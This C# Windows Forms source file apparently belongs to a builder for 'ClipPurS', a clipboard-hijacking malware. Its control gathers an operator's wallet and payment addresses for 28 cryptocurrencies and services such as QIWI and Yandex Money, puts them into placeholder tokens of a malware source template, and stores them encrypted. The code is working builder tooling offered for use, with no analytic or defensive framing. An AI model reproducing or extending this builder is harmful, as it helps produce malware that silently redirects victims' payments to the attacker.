using System;
using System.IO;
using System.Linq;
using System.Threading;
using System.Windows.Forms;
using ClipPurSEditionBuilder.Sticks;

namespace ClipPurSEditionBuilder.ControlsSE
{
    public partial class WalletSE : UserControl
    {
        public WalletSE() => InitializeComponent();

        /// <summary>
        /// Файл куда будут сохранятся данные из TextBox'ов
        /// </summary>
        private static readonly string DataFile = FileControl.CombinePath(GlobalPath.CurrDir, "WalletSE.dat");

        /// <summary>
        /// Запрет ввода Русских букв в поле ввода.
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void TextBoxOnTextChanged(object sender, KeyPressEventArgs e)
        {
            char Key = e.KeyChar;

            if ((Key < 'A' || Key > 'Z') && (Key < 'a' || Key > 'z') && (Key < '0' || Key > '9') && Key != '_' && Key != (char)Keys.Back)
            {
                e.Handled = true;
            }
        }

        /// <summary>
        /// Замена исходного текста на текст из полей TextBox
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void AddDataToBuilder_Click(object sender, EventArgs e)
        {
            NativeMethods.SetFocus(IntPtr.Zero);
            SourceEdition.values["[BTC]"] = this.BitcointBox.Text;
            SourceEdition.values["[BTDARK]"] = this.DarkBitcoinBox.Text;
            SourceEdition.values["[BCH]"] = this.BitCashBox.Text;
            SourceEdition.values["[BTGOLD]"] = this.BitGoldBox.Text;
            SourceEdition.values["[BNB]"] = this.BinanceBox.Text;
            SourceEdition.values["[BCN]"] = this.BytecoinBox.Text;
            SourceEdition.values["[BJack]"] = this.BlackjackBox.Text;
            SourceEdition.values["[BN]"] = this.BlockNetBox.Text;
            SourceEdition.values["[DASH]"] = this.DashBox.Text;
            SourceEdition.values["[DOGE]"] = this.DogeBox.Text;
            SourceEdition.values["[DONATE]"] = this.DonAlertBox.Text;
            SourceEdition.values["[PAYEER]"] = this.PayeerBox.Text;
            SourceEdition.values["[XMR]"] = this.XmrBox.Text;
            SourceEdition.values["[STELLAR]"] = this.StellarBox.Text;
            SourceEdition.values["[QTUM]"] = this.QtumBox.Text;
            SourceEdition.values["[QIWI]"] = this.QiwiBox.Text;
            SourceEdition.values["[ETH]"] = this.EtherBox.Text;
            SourceEdition.values["[EOS]"] = this.EosBox.Text;
            SourceEdition.values["[LISK]"] = this.LiskBox.Text;
            SourceEdition.values["[LTC]"] = this.LiteBox.Text;
            SourceEdition.values["[WAVES]"] = this.WavesBox.Text;
            SourceEdition.values["[RIPPLE]"] = this.RippleBox.Text;
            SourceEdition.values["[ADA]"] = this.AdaBox.Text;
            SourceEdition.values["[IOTA]"] = this.IotaBox.Text;
            SourceEdition.values["[ZCASH]"] = this.ZcashBox.Text;
            SourceEdition.values["[NEO]"] = this.NeoBox.Text;
            SourceEdition.values["[TRON]"] = this.TronBox.Text;
            SourceEdition.values["[YANDEXMONEY]"] = this.YandexBox.Text;

            if (Thread.CurrentThread.CurrentCulture.TwoLetterISOLanguageName.Equals("en", StringComparison.InvariantCultureIgnoreCase))
            {
                ControlActive.CheckMessage(this.ShowMessage, Language.GlobalMessageStrings_en_US.DataAdd);
            }
            else
            {
                ControlActive.CheckMessage(this.ShowMessage, Language.GlobalMessageStrings_ru_RU.DataAdd);
            }
        }

        /// <summary>
        /// Подвешивание событий для кнопок
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void WalletSE_Load(object sender, EventArgs e)
        {
            this.BitcointBox.KeyPress += new KeyPressEventHandler(TextBoxOnTextChanged);
            this.DarkBitcoinBox.KeyPress += new KeyPressEventHandler(TextBoxOnTextChanged);
            this.BitCashBox.KeyPress += new KeyPressEventHandler(TextBoxOnTextChanged);
            this.BitGoldBox.KeyPress += new KeyPressEventHandler(TextBoxOnTextChanged);
            this.BinanceBox.KeyPress += new KeyPressEventHandler(TextBoxOnTextChanged);
            this.BytecoinBox.KeyPress += new KeyPressEventHandler(TextBoxOnTextChanged);
            this.BlackjackBox.KeyPress += new KeyPressEventHandler(TextBoxOnTextChanged);
            this.BlockNetBox.KeyPress += new KeyPressEventHandler(TextBoxOnTextChanged);
            this.DashBox.KeyPress += new KeyPressEventHandler(TextBoxOnTextChanged);
            this.DogeBox.KeyPress += new KeyPressEventHandler(TextBoxOnTextChanged);
            this.DonAlertBox.KeyPress += new KeyPressEventHandler(TextBoxOnTextChanged);
            this.PayeerBox.KeyPress += new KeyPressEventHandler(TextBoxOnTextChanged);
            this.XmrBox.KeyPress += new KeyPressEventHandler(TextBoxOnTextChanged);
            this.StellarBox.KeyPress += new KeyPressEventHandler(TextBoxOnTextChanged);
            this.QtumBox.KeyPress += new KeyPressEventHandler(TextBoxOnTextChanged);
            this.QiwiBox.KeyPress += new KeyPressEventHandler(TextBoxOnTextChanged);
            this.EtherBox.KeyPress += new KeyPressEventHandler(TextBoxOnTextChanged);
            this.EosBox.KeyPress += new KeyPressEventHandler(TextBoxOnTextChanged);
            this.LiskBox.KeyPress += new KeyPressEventHandler(TextBoxOnTextChanged);
            this.LiteBox.KeyPress += new KeyPressEventHandler(TextBoxOnTextChanged);
            this.WavesBox.KeyPress += new KeyPressEventHandler(TextBoxOnTextChanged);
            this.RippleBox.KeyPress += new KeyPressEventHandler(TextBoxOnTextChanged);
            this.AdaBox.KeyPress += new KeyPressEventHandler(TextBoxOnTextChanged);
            this.IotaBox.KeyPress += new KeyPressEventHandler(TextBoxOnTextChanged);
            this.ZcashBox.KeyPress += new KeyPressEventHandler(TextBoxOnTextChanged);
            this.NeoBox.KeyPress += new KeyPressEventHandler(TextBoxOnTextChanged);
            this.TronBox.KeyPress += new KeyPressEventHandler(TextBoxOnTextChanged);
            this.YandexBox.KeyPress += new KeyPressEventHandler(TextBoxOnTextChanged);
        }

        /// <summary>
        /// Вызов метода сохранения данных на кнопку
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void SaveBoxs_Click(object sender, EventArgs e) => SaveDataInFile(DataFile);

        /// <summary>
        /// Вызов метода загрузки данных на кнопку
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void LoadBoxs_Click(object sender, EventArgs e) => LoadDataFromFile(DataFile);

        /// <summary>
        /// Кнопка для отчищения всех полей TextBox
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void FieldsClean_Click(object sender, EventArgs e)
        {
            ControlActive.CleanAllTextBoxesIn(this);
            if (Thread.CurrentThread.CurrentCulture.TwoLetterISOLanguageName.Equals("en", StringComparison.InvariantCultureIgnoreCase))
            {
                ControlActive.CheckMessage(this.ShowMessage, Language.GlobalMessageStrings_en_US.FieldsClean);
            }
            else
            {
                ControlActive.CheckMessage(this.ShowMessage, Language.GlobalMessageStrings_ru_RU.FieldsClean);
            }
        }

        /// <summary>
        /// Метод для загрузки данных из файла в TextBox'ы
        /// </summary>
        /// <param name="path"></param>
        private void LoadDataFromFile(string path)
        {
            if (FileControl.ExistsFile(path))
            {
                try
                {
                    string[] text = File.ReadAllLines(path);
                    // 0 + 1

                    this.BitcointBox.Text = EncryptKey.Decrypt(text[0], GlobalPath.SecretKey_Public);
                    this.DarkBitcoinBox.Text = EncryptKey.Decrypt(text[1], GlobalPath.SecretKey_Public);
                    this.BitCashBox.Text = EncryptKey.Decrypt(text[2], GlobalPath.SecretKey_Public);
                    this.BitGoldBox.Text = EncryptKey.Decrypt(text[3], GlobalPath.SecretKey_Public);
                    this.BinanceBox.Text = EncryptKey.Decrypt(text[4], GlobalPath.SecretKey_Public);
                    this.BytecoinBox.Text = EncryptKey.Decrypt(text[5], GlobalPath.SecretKey_Public);
                    this.BlackjackBox.Text = EncryptKey.Decrypt(text[6], GlobalPath.SecretKey_Public);
                    this.BlockNetBox.Text = EncryptKey.Decrypt(text[7], GlobalPath.SecretKey_Public);
                    this.DashBox.Text = EncryptKey.Decrypt(text[8], GlobalPath.SecretKey_Public);
                    this.DogeBox.Text = EncryptKey.Decrypt(text[9], GlobalPath.SecretKey_Public);
                    this.DonAlertBox.Text = EncryptKey.Decrypt(text[10], GlobalPath.SecretKey_Public);
                    this.PayeerBox.Text = EncryptKey.Decrypt(text[11], GlobalPath.SecretKey_Public);
                    this.XmrBox.Text = EncryptKey.Decrypt(text[12], GlobalPath.SecretKey_Public);
                    this.StellarBox.Text = EncryptKey.Decrypt(text[13], GlobalPath.SecretKey_Public);
                    this.QtumBox.Text = EncryptKey.Decrypt(text[14], GlobalPath.SecretKey_Public);
                    this.QiwiBox.Text = EncryptKey.Decrypt(text[15], GlobalPath.SecretKey_Public);
                    this.EtherBox.Text = EncryptKey.Decrypt(text[16], GlobalPath.SecretKey_Public);
                    this.EosBox.Text = EncryptKey.Decrypt(text[17], GlobalPath.SecretKey_Public);
                    this.LiskBox.Text = EncryptKey.Decrypt(text[18], GlobalPath.SecretKey_Public);
                    this.LiteBox.Text = EncryptKey.Decrypt(text[19], GlobalPath.SecretKey_Public);
                    this.WavesBox.Text = EncryptKey.Decrypt(text[20], GlobalPath.SecretKey_Public);
                    this.RippleBox.Text = EncryptKey.Decrypt(text[21], GlobalPath.SecretKey_Public);
                    this.AdaBox.Text = EncryptKey.Decrypt(text[22], GlobalPath.SecretKey_Public);
                    this.IotaBox.Text = EncryptKey.Decrypt(text[23], GlobalPath.SecretKey_Public);
                    this.ZcashBox.Text = EncryptKey.Decrypt(text[24], GlobalPath.SecretKey_Public);
                    this.NeoBox.Text = EncryptKey.Decrypt(text[25], GlobalPath.SecretKey_Public);
                    this.TronBox.Text = EncryptKey.Decrypt(text[26], GlobalPath.SecretKey_Public);
                    this.YandexBox.Text = EncryptKey.Decrypt(text[27], GlobalPath.SecretKey_Public);

                    if (Thread.CurrentThread.CurrentCulture.TwoLetterISOLanguageName.Equals("en", StringComparison.InvariantCultureIgnoreCase))
                    {
                        ControlActive.CheckMessage(this.ShowMessage, Language.GlobalMessageStrings_en_US.DataLoader);
                    }
                    else
                    {
                        ControlActive.CheckMessage(this.ShowMessage, Language.GlobalMessageStrings_ru_RU.DataLoader);
                    }
                }
                catch (Exception ex)
                {
                    if (Thread.CurrentThread.CurrentCulture.TwoLetterISOLanguageName.Equals("en", StringComparison.InvariantCultureIgnoreCase))
                    {
                        ControlActive.CheckMessage(this.ShowMessage, Language.GlobalMessageStrings_en_US.ErrorLoader);
                    }
                    else
                    {
                        ControlActive.CheckMessage(this.ShowMessage, Language.GlobalMessageStrings_ru_RU.ErrorLoader);
                    }
                    FileControl.CreateFile(FileControl.CombinePath(GlobalPath.CurrDir, "ErrorLoad.txt"), ex.Message);
                }
            }
            else
            {
                if (Thread.CurrentThread.CurrentCulture.TwoLetterISOLanguageName.Equals("en", StringComparison.InvariantCultureIgnoreCase))
                {
                    ControlActive.CheckMessage(this.ShowMessage, Language.GlobalMessageStrings_en_US.FileExists);
                }
                else
                {
                    ControlActive.CheckMessage(this.ShowMessage, Language.GlobalMessageStrings_ru_RU.FileExists);
                }
            }
        }

        /// <summary>
        ///  Метод для сохранения данных в файла из TextBox'ов
        /// </summary>
        /// <param name="path"></param>
        public void SaveDataInFile(string path)
        {
            try
            {
                if (!CheckIsEmptyBoxs())
                {
                    if (Thread.CurrentThread.CurrentCulture.TwoLetterISOLanguageName.Equals("en", StringComparison.InvariantCultureIgnoreCase))
                    {
                        ControlActive.CheckMessage(this.ShowMessage, Language.GlobalMessageStrings_en_US.EmptySave);
                    }
                    else
                    {
                        ControlActive.CheckMessage(this.ShowMessage, Language.GlobalMessageStrings_ru_RU.EmptySave);
                    }
                }
                else
                {
                    using (var sw = new StreamWriter(path))
                    {
                        sw.WriteLine(EncryptKey.Encrypt(this.BitcointBox.Text, GlobalPath.SecretKey_Public));
                        sw.WriteLine(EncryptKey.Encrypt(this.DarkBitcoinBox.Text, GlobalPath.SecretKey_Public));
                        sw.WriteLine(EncryptKey.Encrypt(this.BitCashBox.Text, GlobalPath.SecretKey_Public));
                        sw.WriteLine(EncryptKey.Encrypt(this.BitGoldBox.Text, GlobalPath.SecretKey_Public));
                        sw.WriteLine(EncryptKey.Encrypt(this.BinanceBox.Text, GlobalPath.SecretKey_Public));
                        sw.WriteLine(EncryptKey.Encrypt(this.BytecoinBox.Text, GlobalPath.SecretKey_Public));
                        sw.WriteLine(EncryptKey.Encrypt(this.BlackjackBox.Text, GlobalPath.SecretKey_Public));
                        sw.WriteLine(EncryptKey.Encrypt(this.BlockNetBox.Text, GlobalPath.SecretKey_Public));
                        sw.WriteLine(EncryptKey.Encrypt(this.DashBox.Text, GlobalPath.SecretKey_Public));
                        sw.WriteLine(EncryptKey.Encrypt(this.DogeBox.Text, GlobalPath.SecretKey_Public));
                        sw.WriteLine(EncryptKey.Encrypt(this.DonAlertBox.Text, GlobalPath.SecretKey_Public));
                        sw.WriteLine(EncryptKey.Encrypt(this.PayeerBox.Text, GlobalPath.SecretKey_Public));
                        sw.WriteLine(EncryptKey.Encrypt(this.XmrBox.Text, GlobalPath.SecretKey_Public));
                        sw.WriteLine(EncryptKey.Encrypt(this.StellarBox.Text, GlobalPath.SecretKey_Public));
                        sw.WriteLine(EncryptKey.Encrypt(this.QtumBox.Text, GlobalPath.SecretKey_Public));
                        sw.WriteLine(EncryptKey.Encrypt(this.QiwiBox.Text, GlobalPath.SecretKey_Public));
                        sw.WriteLine(EncryptKey.Encrypt(this.EtherBox.Text, GlobalPath.SecretKey_Public));
                        sw.WriteLine(EncryptKey.Encrypt(this.EosBox.Text, GlobalPath.SecretKey_Public));
                        sw.WriteLine(EncryptKey.Encrypt(this.LiskBox.Text, GlobalPath.SecretKey_Public));
                        sw.WriteLine(EncryptKey.Encrypt(this.LiteBox.Text, GlobalPath.SecretKey_Public));
                        sw.WriteLine(EncryptKey.Encrypt(this.WavesBox.Text, GlobalPath.SecretKey_Public));
                        sw.WriteLine(EncryptKey.Encrypt(this.RippleBox.Text, GlobalPath.SecretKey_Public));
                        sw.WriteLine(EncryptKey.Encrypt(this.AdaBox.Text, GlobalPath.SecretKey_Public));
                        sw.WriteLine(EncryptKey.Encrypt(this.IotaBox.Text, GlobalPath.SecretKey_Public));
                        sw.WriteLine(EncryptKey.Encrypt(this.ZcashBox.Text, GlobalPath.SecretKey_Public));
                        sw.WriteLine(EncryptKey.Encrypt(this.NeoBox.Text, GlobalPath.SecretKey_Public));
                        sw.WriteLine(EncryptKey.Encrypt(this.TronBox.Text, GlobalPath.SecretKey_Public));
                        sw.WriteLine(EncryptKey.Encrypt(this.YandexBox.Text, GlobalPath.SecretKey_Public));
                        // 28
                        sw.Flush();

                        if (Thread.CurrentThread.CurrentCulture.TwoLetterISOLanguageName.Equals("en", StringComparison.InvariantCultureIgnoreCase))
                        {
                            ControlActive.CheckMessage(this.ShowMessage, Language.GlobalMessageStrings_en_US.DataSave);
                        }
                        else
                        {
                            ControlActive.CheckMessage(this.ShowMessage, Language.GlobalMessageStrings_ru_RU.DataSave);
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                if (Thread.CurrentThread.CurrentCulture.TwoLetterISOLanguageName.Equals("en", StringComparison.InvariantCultureIgnoreCase))
                {
                    ControlActive.CheckMessage(this.ShowMessage, Language.GlobalMessageStrings_en_US.ErrorSave);
                }
                else
                {
                    ControlActive.CheckMessage(this.ShowMessage, Language.GlobalMessageStrings_ru_RU.ErrorSave);
                }
                FileControl.CreateFile(FileControl.CombinePath(GlobalPath.CurrDir, "ErrorSave.txt"), ex.Message);
            }
        }

        private bool CheckIsEmptyBoxs() => this.Controls.OfType<TextBox>().Any(x => !string.IsNullOrEmpty(x.Text));
    }
}